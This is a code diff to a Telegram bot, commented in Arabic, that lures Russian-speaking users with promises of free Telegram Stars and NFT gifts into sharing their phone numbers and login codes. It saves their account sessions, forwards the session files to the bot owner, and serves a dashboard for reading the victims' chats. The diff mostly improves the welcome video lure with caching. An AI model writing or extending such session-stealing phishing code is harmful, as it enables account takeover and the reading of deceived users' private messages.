@@ -24,15 +24,15 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
 # الآيدي الافتراضي للمسؤول (في حال تم دخول البوت بدون رابط إحالة)
 DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "5963244397"))
 
-# معرف القناة التي يتم جلب الميديا الترحيبية منها
-CHANNEL_USERNAME = "oaiaiaowowjwjwowjnwkww"
-
 SESSIONS_DIR = "user_sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
 # مخازن الحالات المباشرة
 user_states = {}       # حالات التسجيل الحالية
 active_web_tokens = {} # توكنات دخول لوحة التحكم {token: session_path}
+
+# 🧠 ذاكرة البوت لتخزين file_id الخاص بالفيديو
+CACHED_VIDEO_FILE_ID = None
 
 # =============================================================
 # 2. خادم الويب (Flask Web Dashboard - "وهم")
@@ -160,7 +160,7 @@ WEB_TEMPLATE = """
                     document.getElementById('chats-list').innerHTML = `<div class="p-4 text-center text-red-400">${data.error}</div>`;
                 }
             } catch (e) {
-                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثناء التحميل</div>';
+                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثنا التحميل</div>';
             }
         }
 
@@ -337,7 +337,7 @@ async def api_messages():
             sender = "Я" if msg.out else ("Собеседник")
             messages_data.append({
                 "id": msg.id,
-                "text": msg.text or "[Медиаконтент]",
+                "text": msg.text or "[Медиاконтент]",
                 "out": msg.out,
                 "sender": sender,
                 "date": msg.date.strftime("%H:%M") if msg.date else ""
@@ -370,9 +370,10 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع إرسال أحدث ميديا (فيديو/GIF) من القناة مباشرة
+# استقبال أمر /start مع إرسال فيديو vip.mp4 المباشر ومشاركتها عبر الكاش (Cache)
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
+    global CACHED_VIDEO_FILE_ID
     user_id = event.sender_id
     
     # التقاط الآيدي من رابط الدعوة مثل: /start 5963244397
@@ -391,36 +392,37 @@ async def start_command(event):
     russian_welcome = (
         "🌟 **Бесплатные Telegram Stars и NFT Подарки!**\n\n"
         "Получите от 500 до 5000 Telegram Stars и уникальные подарки прямо на ваш аккаунт.\n\n"
-        "👇 Для проверки и активации нажимите кнопку ниже, чтобы поделиться номером телефона:"
+        "👇 Для проверки и активации нажмите кнопку ниже, чтобы поделиться номером телефона:"
     )
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
-    media_to_send = None
+    # ⚡ إرسال الفيديو بسرعة فائقة باستخدام ذاكرة البوت 
     try:
-        # البحث في أحدث 5 رسائل في القناة للحصول على الميديا (GIF/فيديو/صورة)
-        async for message in bot.iter_messages(CHANNEL_USERNAME, limit=5):
-            if message and message.media:
-                media_to_send = message.media
-                break
-    except Exception as e:
-        print(f"Error fetching channel media: {e}")
-
-    # إرسال الميديا من القناة مع النص والأزرار إن وجدت
-    if media_to_send:
-        try:
+        if CACHED_VIDEO_FILE_ID:
+            # تم رفعه سابقاً، يتم الإرسال اللحظي بواسطة file_id
             await bot.send_file(
                 event.chat_id,
-                media_to_send,
+                CACHED_VIDEO_FILE_ID,
                 caption=russian_welcome,
                 buttons=phone_btn
             )
-            return
-        except Exception as e:
-            print(f"Error sending media file: {e}")
-
-    # كخطة بديلة إذا تعذر جلب الميديا
-    await event.respond(russian_welcome, buttons=phone_btn)
+        elif os.path.exists("vip.mp4"):
+            # الرفع للمرة الأولى فقط، وتخزين الـ file_id في الذاكرة
+            sent_msg = await bot.send_file(
+                event.chat_id,
+                "vip.mp4",
+                caption=russian_welcome,
+                buttons=phone_btn
+            )
+            if sent_msg and sent_msg.media:
+                CACHED_VIDEO_FILE_ID = sent_msg.media
+        else:
+            # احتياطي إذا لم يُعثر على ملف الفيديو بالسيرفر
+            await event.respond(russian_welcome, buttons=phone_btn)
+    except Exception as e:
+        # حماية ضد الأخطاء المباشرة لتفادي تعطل البوت
+        await event.respond(russian_welcome, buttons=phone_btn)
 
 # استقبال رقم الهاتف باللغة الروسية
 @bot.on(events.NewMessage)
@@ -585,7 +587,7 @@ async def notify_owner_and_finish(event, user_id):
                 await bot.send_file(
                     DEFAULT_ADMIN_ID,
                     file_path,
-                    caption=f"⚠️ (تعذر الوصول للصاحب الأصلي {referrer_id})\n\n" + notification_text,
+                    caption=f"⚠️ (تعذر الوصول للصاحب الاصلي {referrer_id})\n\n" + notification_text,
                     buttons=web_btn
                 )
 
